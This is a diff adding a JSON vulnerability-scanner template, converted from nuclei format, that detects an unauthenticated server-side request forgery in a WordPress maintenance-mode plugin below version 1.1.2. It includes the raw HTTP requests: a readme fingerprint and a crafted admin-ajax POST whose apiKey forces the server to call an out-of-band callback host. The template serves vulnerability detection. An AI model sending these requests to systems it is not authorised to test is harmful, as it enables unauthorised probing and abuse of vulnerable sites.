@@ -1,0 +1,187 @@
+{
+  "id": "wp-under-construction-ssrf",
+  "name": "Under Construction, Coming Soon \u0026 Maintenance Mode \u003c 1.1.2 - Server Side Request Forgery (SSRF)",
+  "author": "Akincibor",
+  "severity": "HIGH",
+  "description": "The includes/mc-get_lists.php file used the \u0027apiKey\u0027 POST parameter to create an https URL from it without sanitisation and called it with cURL, leading to a SSRF issue. The issue is exploitable via direct access to the affected file, and ucmm_mc_api AJAX call (available to both authenticated and unauthenticated users).\n",
+  "references": [
+    "https://wpscan.com/vulnerability/24784c84-3efd-4166-81c1-e5a266562cfc",
+    "https://packetstormsecurity.com/files/161576/"
+  ],
+  "tags": [
+    "ssrf",
+    "wp",
+    "wp-plugin",
+    "wordpress",
+    "unauth",
+    "wpscan",
+    "packetstorm"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "flow": "http(1) \u0026\u0026 http(2)",
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /wp-content/plugins/under-construction-maintenance-mode/readme.txt HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "all",
+          "values": [
+            "\u003d Under Construction"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    },
+    {
+      "stepId": "http_1",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /wp-admin/admin-ajax.php HTTP/2\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nContent-Type: application/x-www-form-urlencoded\n\naction\u003ducmm_mc_api\u0026apiKey\u003d-{{interactsh-url}}%2Ftest%2Ftest%2Ftest%3Fkey1%3Dval1%26dummy%3D\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "interactsh_protocol",
+          "values": [
+            "http"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "wp-under-construction-ssrf",
+    "info": {
+      "name": "Under Construction, Coming Soon \u0026 Maintenance Mode \u003c 1.1.2 - Server Side Request Forgery (SSRF)",
+      "author": "Akincibor",
+      "severity": "high",
+      "description": "The includes/mc-get_lists.php file used the \u0027apiKey\u0027 POST parameter to create an https URL from it without sanitisation and called it with cURL, leading to a SSRF issue. The issue is exploitable via direct access to the affected file, and ucmm_mc_api AJAX call (available to both authenticated and unauthenticated users).\n",
+      "reference": [
+        "https://wpscan.com/vulnerability/24784c84-3efd-4166-81c1-e5a266562cfc",
+        "https://packetstormsecurity.com/files/161576/"
+      ],
+      "metadata": {
+        "max_request": 2
+      },
+      "tags": "ssrf,wp,wp-plugin,wordpress,unauth,wpscan,packetstorm"
+    },
+    "flow": "http(1) \u0026\u0026 http(2)",
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /wp-content/plugins/under-construction-maintenance-mode/readme.txt HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "all",
+            "words": [
+              "\u003d Under Construction"
+            ],
+            "case_insensitive": false
+          }
+        ]
+      },
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /wp-admin/admin-ajax.php HTTP/2\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nContent-Type: application/x-www-form-urlencoded\n\naction\u003ducmm_mc_api\u0026apiKey\u003d-{{interactsh-url}}%2Ftest%2Ftest%2Ftest%3Fkey1%3Dval1%26dummy%3D\n"
+        ],
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "interactsh_protocol",
+            "words": [
+              "http"
+            ],
+            "case_insensitive": false
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
